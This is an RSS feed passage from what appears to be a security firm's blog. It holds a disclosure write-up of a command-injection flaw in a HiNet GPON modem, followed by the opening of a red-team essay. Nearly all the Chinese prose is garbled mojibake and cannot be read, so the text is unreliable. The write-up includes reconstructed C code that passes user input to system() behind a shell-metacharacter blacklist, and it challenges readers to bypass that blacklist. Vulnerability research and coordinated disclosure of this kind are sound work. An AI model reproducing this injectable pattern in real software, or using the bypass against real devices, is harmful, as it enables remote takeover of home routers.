&lt;p&gt;ç¾åœ¨ï¼Œæˆ‘å€‘å¯ä»¥é€éé€†å‘å·¥ç¨‹äº†è§£æ¯å€‹æŒ‡ä»¤èƒŒå¾Œçš„åŸç†åŠå¯¦ä½œäº†! ä¸éé¦–å…ˆï¼Œé€†å‘å·¥ç¨‹æ˜¯ä¸€å€‹ç—›è‹¦ä¸”ç…©æ‚¶çš„ç¶“éï¼Œä¸€å€‹å°å°çš„ç¨‹å¼å¯èƒ½å°±åŒ…å«å¹¾è¬ã€ç”šè‡³åå¹¾è¬è¡Œçš„çµ„åˆèªè¨€ä»£ç¢¼ï¼Œå› æ­¤é€™æ™‚æŒ–æ´çš„ç­–ç•¥å°±è®Šå¾—å¾ˆé‡è¦! å¾åŠŸèƒ½é¢ä¾†çœ‹ï¼Œæ„Ÿè¦ºæœƒå­˜åœ¨å‘½ä»¤æ³¨å…¥ç›¸é—œçš„æ¼æ´ï¼Œå› æ­¤å…ˆä»¥åŠŸèƒ½å¯¦ä½œç‚ºå‡ºç™¼é»é–‹å§‹æŒ–æ˜!&lt;/p&gt;

&lt;p&gt;æ•´å€‹ 3097 æœå‹™çš„è™•ç†æ ¸å¿ƒå…¶å¯¦å°±æ˜¯ä¸€å€‹å¤šå±¤çš„ IF-ELSE é¸é …ï¼Œæ¯ä¸€å€‹å°æ¡†æ¡†å°æ‡‰çš„ä¸€å€‹åŠŸèƒ½çš„å¯¦ä½œï¼Œä¾‹å¦‚ &lt;code class=&quot;highlighter-rouge&quot;&gt;cli_config_cmdline&lt;/code&gt; å°±æ˜¯å°æ‡‰ &lt;code class=&quot;highlighter-rouge&quot;&gt;CONFIG&lt;/code&gt; é€™æ¢æŒ‡ä»¤ï¼Œå› æ­¤æˆ‘å€‘æ­é…è‘— &lt;code class=&quot;highlighter-rouge&quot;&gt;HELP&lt;/code&gt; æŒ‡ä»¤çš„æç¤ºä¸€ä¸€å¾€æ¯å€‹åŠŸèƒ½å¯¦ä½œæŒ–æ˜!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç ”ç©¶äº†ä¸€æ®µæ™‚é–“ï¼Œä¸¦æ²’æœ‰ç™¼ç¾åˆ°ä»€éº¼åš´é‡æ¼æ´ :( ä¸éæˆ‘å€‘æ³¨æ„åˆ°ï¼Œç•¶æ‰€æœ‰æŒ‡å‘½éƒ½åŒ¹é…å¤±æ•—æ™‚ï¼Œæœƒé€²å…¥åˆ°äº†ä¸€å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; çš„å‡½æ•¸ï¼Œé€™å€‹å‡½æ•¸çš„ä¸»è¦ç›®çš„æ˜¯æŠŠåŒ¹é…å¤±æ•—çš„æŒ‡ä»¤æ¥åˆ° &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; å¾Œç¹¼çºŒåŸ·è¡Œ!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; å¤§è‡´é‚è¼¯å¦‚ä¸‹ï¼Œç”±æ–¼ç•¶æ™‚ Ghidra å°šæœªå‡ºç¾ï¼Œæ‰€ä»¥é€™ä»½åŸå§‹ç¢¼æ˜¯å¾é–±è®€ MIPS çµ„åˆèªè¨€æ…¢æ…¢é‚„åŸå›ä¾†çš„! å…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;s1&lt;/code&gt; ç‚ºè¼¸å…¥çš„æŒ‡ä»¤ï¼Œå¦‚æœæŒ‡ä»¤ä¸åœ¨å®šç¾©å¥½çš„åˆ—è¡¨å…§ä»¥åŠæŒ‡ä»¤ä¸­å‡ºç¾å•è™Ÿçš„è©±ï¼Œå°±èˆ‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; æ‹¼æ¹Šèµ·ä¾†ä¸Ÿå…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; åŸ·è¡Œ! ç†æ‰€ç•¶ç„¶ï¼Œç‚ºäº†é˜²æ­¢å‘½ä»¤æ³¨å…¥ç­‰ç›¸é—œå¼±é»ï¼Œåœ¨ä¸Ÿå…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; å‰æœƒå…ˆæ ¹æ“š &lt;code class=&quot;highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; çš„åˆ—è¡¨æª¢æŸ¥æ˜¯å¦å­˜åœ¨æœ‰å®³å­—å…ƒã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;util_trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;\0&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      
  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;util_fdprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid char &#39;%c&#39; in command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/tmpfile.%d.%06ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/diag %s &amp;gt; %s 2&amp;gt;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; å®šç¾©å¦‚ä¸‹:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&amp;lt;&amp;gt;(){}`;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœæ˜¯ä½ çš„è©±ï¼Œèƒ½æƒ³åˆ°å¦‚ä½•ç¹éå—?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç­”æ¡ˆå¾ˆç°¡å–®ï¼Œå‘½ä»¤æ³¨å…¥å¾€å¾€å°±æ˜¯é€™éº¼çš„ç°¡å–®ä¸”æ¨¸å¯¦ç„¡è¯!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€™è£¡æˆ‘å€‘ç¤ºç¯„äº†å¦‚ä½•å¾ PTT çŸ¥é“å—å®³è€… IP åœ°å€ï¼Œåˆ°é€²å…¥å®ƒæ•¸æ“šæ©Ÿå¯¦ç¾çœŸæ­£æ„ç¾©ä¸Šçš„ã€ŒæŒ‡å“ªæ‰“å“ªã€!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Pq00YUoBOsQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;æ•…äº‹åˆ°é€™é‚Šå·®ä¸å¤šé€²å…¥å°¾è²ï¼Œæ•´ç¯‡æ–‡ç« çœ‹ä¼¼è¼•ææ·¡å¯«ï¼Œæè¿°ä¸€å€‹æ¼æ´å¾ç™¼ç¾åˆ°åˆ©ç”¨çš„æ•´å€‹ç¶“éï¼Œå¾çµæœè«–ä¾†èªªä¹Ÿè¨±åªæ˜¯ä¸€å€‹ç°¡å–®çš„å‘½ä»¤æ³¨å…¥ï¼Œä½†å¯¦éš›ä¸Šä¸­é–“æ‰€èŠ±çš„æ™‚é–“ã€èµ°éçš„æ­ªè·¯æ˜¯æ­£åœ¨è®€æ–‡ç« çš„ä½ ç„¡æ³•æƒ³åƒçš„ï¼Œå°±åƒæ˜¯åœ¨é»‘æš—ä¸­èµ°è¿·å®®ï¼Œåœ¨æ²’æœ‰èµ°å‡ºè¿·å®®å‰æ°¸é ä¸æœƒçŸ¥é“è‡ªå·±æ­£åœ¨èµ°çš„é€™æ¢è·¯æ˜¯ä¸æ˜¯é€šå¾€ç›®çš„æ­£ç¢ºé“è·¯!&lt;/p&gt;

&lt;p&gt;æŒ–æ˜å‡ºæ–°çš„æ¼æ´ï¼Œä¸¦ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œå°¤å…¶æ˜¯åœ¨å„å¼æ”»æ“Šæ‰‹æ³•åˆå·²è¶¨æ–¼æˆç†Ÿçš„ä»Šå¤©ï¼Œè¦æƒ³å‡ºå…¨æ–°çš„æ”»æ“Šæ‰‹æ³•æ›´æ˜¯é›£ä¸ŠåŠ é›£! åœ¨æ¼æ´ç ”ç©¶çš„é ˜åŸŸä¸Šï¼Œå°ç£å°šæœªæ“æœ‰è¶³å¤ çš„èƒ½é‡ï¼Œå¦‚æœå¹³å¸¸çš„æŒ‘æˆ°å·²ç¶“æ»¿è¶³ä¸äº†ä½ ï¼Œæƒ³é«”é©—çœŸå¯¦ä¸–ç•Œçš„æ”»é˜²ï¼Œæ­¡è¿åŠ å…¥èˆ‡æˆ‘å€‘ä¸€èµ·äº¤æµè•‰æµ :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;é€šå ±æ™‚ç¨‹&quot;&gt;é€šå ±æ™‚ç¨‹&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2019 å¹´ 07 æœˆ 28 æ—¥ - é€é TWCERT/CC å›å ±ä¸­è¯é›»ä¿¡&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 14 æ—¥ - å» å•†å›è¦†æ¸…æŸ¥ä¸¦ä¿®è£œè¨­å‚™ä¸­&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 27 æ—¥ - å» å•†å›è¦†ä¹æœˆåˆä¿®è£œå®Œç•¢&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 30 æ—¥ - å» å•†å›è¦†å·²å®Œæˆå—å½±éŸ¿è¨­å‚™çš„éŸŒé«”æ›´æ–°&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 11 æ—¥ - å» å•†å›è¦†éƒ¨åˆ†ç”¨æˆ¶éœ€æ´¾å“¡æ›´æ–°, å»¶å¾Œå…¬é–‹æ™‚é–“&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 23 æ—¥ - èˆ‡ TWCERT/CC ç¢ºèªå¯å…¬é–‹&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 25 æ—¥ - ç™¼è¡¨è‡³ DEVCORE Conference 2019&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 11 æœˆ 11 æ—¥ - éƒ¨è½æ ¼æ–‡ç« é‡‹å‡º&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE/</link>
                <guid>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE</guid>
                <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE ç´…éšŠçš„é€²åŒ–ï¼Œèˆ‡ä¸‹ä¸€æ­¥</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;ã€Œç´…éšŠæ¼”ç·´ã€è¿‘å¹´ä¾†æ¼¸æ¼¸é–‹å§‹è¢«å¤§å®¶æåŠï¼Œä¹Ÿé–‹å§‹æœ‰ä¸€äº›å» å•†æ¨å‡ºç´…éšŠæœå‹™ã€‚ä¸éé—œæ–¼åœ¨å°ç£ç´…éšŠæ˜¯æ€éº¼åšçš„å°±æ¯”è¼ƒå°‘äººå…¬é–‹åˆ†äº«ï¼Œèº«ç‚ºç¬¬ä¸€å€‹åœ¨å°ç£æ¨ç´…éšŠæ¼”ç·´çš„å…¬å¸ï¼Œæˆ‘æƒ³å°±æ ¹æ“šé€™å…©å¹´å¤šä¾†çš„å¯¦æˆ°ç¶“é©—ï¼Œåˆ†äº«ç‚ºä»€éº¼æˆ‘å€‘è¦åšç´…éšŠã€æˆ‘å€‘é¢è‡¨åˆ°çš„å•é¡Œã€ä»¥åŠåœ¨æˆ‘å€‘å¿ƒä¸­èªç‚ºç´…éšŠæˆå“¡æ‡‰è©²å…·å‚™çš„ç‰¹è³ªã€‚æœ€å¾Œå†åˆ†äº«æˆ‘å€‘ç¾éšæ®µçœ‹åˆ°çš„ä¼æ¥­è³‡å®‰å•é¡Œï¼ŒæœŸæœ›æœªä¾†æˆ‘å€‘ä¹Ÿå¯ä»¥é€éç´…éšŠæ¼”ç·´ä¾†å¹«åŠ©ä¼æ¥­è£œè¶³é‚£äº›å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;é€™ä¸€ç¯‡æ˜¯æˆ‘åœ¨ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; æ‰€åˆ†äº«çš„ä¸»é¡Œã€‚ç ”è¨æœƒäº‹å‰èª¿æŸ¥æƒ³è½å…§å®¹æ™‚æœ‰äº›æœ‹å‹å¸Œæœ›æˆ‘å€‘èƒ½ä»‹ç´¹ DEVCORE çš„ç´…éšŠï¼Œé‚„æœ‰é‹ä½œæ–¹å¼å’Œæ¡ˆä¾‹ï¼Œæ‰€ä»¥æˆ‘æŠ½å‡ºä¸€äº›ç´ ææ•´ç†æˆé€™å ´æ¼”è¬›ã€‚ä¸‹é¢æ˜¯æŠ•å½±ç‰‡é€£çµï¼Œå…¶ä¸­æœ‰äº›å…§éƒ¨ç³»çµ±ç•«é¢ä¸å°å¤–å…¬é–‹ï¼Œåƒ…åœ¨ç ”è¨æœƒåˆ†äº«æ•¬è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/conf/2019/slides/devcore-conf-2019-shaolin-DEVCORE%20%E7%B4%85%E9%9A%8A%E7%9A%84%E9%80%B2%E5%8C%96%EF%BC%8C%E8%88%87%E4%B8%8B%E4%B8%80%E6%AD%A5.pdf&quot;&gt;DEVCORE ç´…éšŠçš„é€²åŒ–ï¼Œèˆ‡ä¸‹ä¸€æ­¥ ï¼ Shaolin (DEVCORE CONF 2019)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ç‚ºä»€éº¼è¦ç´…éšŠæ¼”ç·´&quot;&gt;ç‚ºä»€éº¼è¦ç´…éšŠæ¼”ç·´ï¼Ÿ&lt;/h2&gt;

&lt;p&gt;ä¸€è¨€ä»¥è”½ä¹‹ï¼Œå°±æ˜¯æˆ‘å€‘æ¼¸æ¼¸é«”æœƒåˆ°ï¼š&lt;strong&gt;å°å¤§ä¼æ¥­è€Œè¨€ï¼Œå–®ç´”çš„æ»²é€æ¸¬è©¦ä¸¦ä¸æ˜¯æœ€æœ‰æ•ˆç›Šçš„&lt;/strong&gt;ã€‚å¾éå»ä¸Šç™¾æ¬¡æ»²é€æ¸¬è©¦ç¶“é©—ä¸­ï¼Œæˆ‘å€‘å¾€å¾€èƒ½åœ¨å°ˆæ¡ˆåˆæœŸçš„åµæŸ¥éšæ®µï¼Œç™¼ç¾ä¼æ¥­é‚Šç•Œå­˜åœ¨åš´é‡å¼±é»ï¼Œé€²è€Œé€²å…¥å…§ç¶²ç¹éå±¤å±¤é˜²ç¦¦æ”»æ“Šä¸»è¦ç›®æ¨™ã€‚è¶Šæ˜¯é¾å¤§çš„ä¼æ¥­ï¼Œé€™ç¨®ç‹€æ³æœƒè¶Šæ˜é¡¯ï¼Œå› ç‚ºä»–å€‘é€šå¸¸æœ‰å¾ˆå¤šå°å¤–çš„ç¶²ç«™ã€ç¶²è·¯è¨­å‚™ï¼Œæ¯ä¸€å€‹éƒ½å¯èƒ½æ˜¯é¢¨éšªï¼Œå³ä½¿ä¸»è¦ç¶²ç«™é˜²è­·å¾ˆå®Œå‚™ï¼Œé§­å®¢åªéœ€è¦å¾é€™éº¼å¤šç›®æ¨™ä¸­æ‰¾åˆ°ä¸€å€‹å•é¡Œï¼Œå°±å¯ä»¥å°ä¼æ¥­é€ æˆå‚·å®³ã€‚ä»Šå¤©å°±ç®—ä¼æ¥­å°æ¯å€‹æœå‹™éƒ½ç¨ç«‹åšäº†ä¸€æ¬¡æ»²é€æ¸¬è©¦ï¼Œåœ¨çœŸå¯¦ä¸–ç•Œä¸­ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å¾ç¬¬ä¸‰æ–¹æœå‹™ã€å» å•†ä¾›æ‡‰éˆã€ç¤¾äº¤å·¥ç¨‹ç­‰é€”å¾‘å…¥ä¾µã€‚æ‰€ä»¥æœ‰å¯èƒ½æŠ•æ³¨å¾ˆå¤šè³‡æºåšæ¸¬è©¦ï¼Œçµæœé‚„æ˜¯ç™¼ç”Ÿè³‡å®‰äº‹ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯ï¼Œæˆ‘å€‘æ¨å‡ºäº†ç´…éšŠæ¼”ç·´ï¼Œå¸Œæœ›é€éçœŸå¯¦çš„æ¼”ç·´å¹«åŠ©ä¼æ¥­æ‰¾åˆ°æ•´é«”æ¶æ§‹ä¸­è„†å¼±çš„åœ°æ–¹ã€‚å› æ­¤ï¼Œé€™å€‹æœå‹™é—œæ³¨çš„æ˜¯&lt;strong&gt;ä¼æ¥­æ•´é«”çš„å®‰å…¨æ€§&lt;/strong&gt;ï¼Œè€Œä¸å†åªæ˜¯å–®ä¸€çš„ç¶²ç«™ã€‚&lt;/p&gt;

